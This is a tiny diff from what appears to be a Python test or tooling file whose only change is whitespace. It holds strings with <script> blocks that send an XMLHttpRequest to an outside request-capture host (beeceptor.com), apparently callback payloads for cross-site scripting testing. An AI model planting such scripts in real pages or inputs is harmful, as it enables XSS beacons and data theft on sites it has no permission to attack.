@@ -7,7 +7,7 @@ test = '''<script>
              var x = new XMLHttpRequest();
              x.open("GET", "https://random.free.beeceptor.com?test=0", true);
              x.send()
-         </script>'''
+          </script>'''
 
 js = f'''<script>
              var x = new XMLHttpRequest();
